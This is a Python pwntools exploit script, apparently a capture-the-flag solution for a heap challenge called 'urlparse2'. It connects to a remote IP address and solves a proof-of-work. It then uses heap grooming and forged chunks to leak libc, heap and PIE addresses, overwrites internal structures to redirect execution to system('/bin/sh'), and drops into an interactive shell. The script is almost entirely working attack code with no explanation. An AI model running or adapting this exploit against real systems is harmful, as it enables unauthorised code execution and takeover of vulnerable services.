#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

__author__ = "luckasdf0"

from pwn import *
from itertools import product
from hashlib import sha256
from time import sleep

# Settings
context.terminal = ['tmux', 'splitw', '-h']

# Global
EXEC = 0x0000555555554000

io = remote("47.75.4.252", 10011)
#io = process("./cb57c387-959a-4dd1-845c-48701eabc608.urlparse2-123d085f1337ff85aaff95b1c23e5cabedc6e2cb", env = {"LD_PRELOAD" : "./libc.so.6-56d992a0342a67a887b8dcaae381d2cc51205253"})
#io = process("./cb57c387-959a-4dd1-845c-48701eabc608.urlparse2-123d085f1337ff85aaff95b1c23e5cabedc6e2cb")

# gdb
def attach(addr):
    gdb.attach(io, gdbscript='b *0x%x' % (EXEC+addr))

def create(size, url):
    io.recvuntil('6: exit')
    io.sendline('1')
    io.recvuntil('size:')
    io.sendline(str(size))
    io.recvuntil('URL:')
    io.sendline(url)

def encode(idx):
    io.recvuntil('6: exit')
    io.sendline('2')
    io.recvuntil('index: ')
    io.sendline(str(idx))

def decode(idx):
    io.recvuntil('6: exit')
    io.sendline('3')
    io.recvuntil('index: ')
    io.sendline(str(idx))

def delete(idx):
    io.recvuntil('6: exit')
    io.sendline('5')
    io.recvuntil('index: ')
    io.sendline(str(idx))

def _list():
    io.recvuntil('6: exit')
    io.sendline('4')

chs = string.ascii_letters+string.digits

def proof():
    global io, chs
    io.recvuntil('xxxx+')
    s = io.recv(16)
    io.recvuntil('== ')
    d = io.recv(64)
    print s, d
    for i in product(chs, repeat=4):
        if sha256(''.join(i)+s).hexdigest() == d:
            print bytearray(i)
            res = ''.join(i)
            break
    io.sendlineafter('xxxx:', res)

proof()

create(0x100, '\x11' * 0xff)

payload = '\x11' * 0xcd + '%F'
create(0xd0, payload)
#payload = '\x11' * 0x8d + '%F'
#create(0x90, payload)
create(0x300, '\x11' * 0x2ff)
create(0x80, 'A'*0x7f)
create(0x80, 'A'*0x7f)

#attach(0xA30)
create(0x90, '0'*0x8f)
create(0x90, '1'*0x8f)
create(0xa0, '2'*0x9f)
create(0xa0, '3'*0x9f)

pad_size = 0x3008-0x90*2-0xa0*2-0xb0*2-0x200

create(pad_size, '\0'*pad_size)

encode(8)
delete(7)
delete(6)

create(0x1f0, 'b'*0x1ef)
create(0x108, 'b'*0x105+"%F")

_list()
io.recvuntil("0:")
io.recvuntil("b"*0x108)
main_arena = u64(io.recv(6).ljust(0x8, '\0'))
libc_base = main_arena-0x3c4bf8
log.info("main_arena 0x%016x" % main_arena)
log.info("libc_base 0x%016x" % libc_base)

# leak heap
create(0x110, 'l'*0x108+p64(libc_base+0x3c4b70))

io.sendline('\n')
_list()

io.recvuntil("8: ")
heap_base = u64(io.recv(6).ljust(0x8, '\x00'))-0x630
log.info("heap_base 0x%016x" % heap_base)

# leak pie
delete(0)
create(0x110, 'l'*0x108+p64(libc_base+0x3c3f48))
_list()

io.recvuntil("8: ")
pie = u64(io.recv(6).ljust(0x8, '\x00'))-0x630-0x2019f0
log.info("pie 0x%016x" % pie)

delete(0)
create(0x110, 'l'*0x108+p64(pie+0x202050))

create(0x200, 'b'*0x100)
create(0x200, 'b'*0x78+p64(pie+0x202050))

delete(1)

chunk = ''
chunk += p64(0x0)
chunk += p64(0x101)
chunk += p64(0x0)
chunk += 'A'*0xe8
chunk += p64(0x100)
chunk += p64(0x21)
chunk += 'A'*0x20
chunk += p64(0x20)
chunk += p64(0x21)

create(0x300, chunk)

delete(6)

chunk = ''
chunk += '/bin/sh\x00'
chunk += p64(0x61)
chunk += p64(0x0)
chunk += p64(libc_base+0x3c5520-0x10)
chunk += 'A'*0x40
chunk += p64(0x60)
chunk += p64(0x21)
chunk += 'A'*0x20
chunk += p64(0x20)
chunk += p64(0x21)
chunk += p64(heap_base+0x100)
#chunk += p64(0xdeadbeefdeadbeef)
chunk += p64(libc_base+0x0000000000045390)
chunk += 'A'*0x28
chunk += p64(pie+0x2020e8-0x18)
chunk += 'A'*0x100

create(0x1f8, chunk)

#attach(0x142D)
io.recvuntil('6: exit')
io.sendline('1')
io.recvuntil('size:')
io.sendline(str(0xe8))

#create(0xe8, 'A'*0xe7)

io.interactive()
chs = string.ascii_letters+string.digits

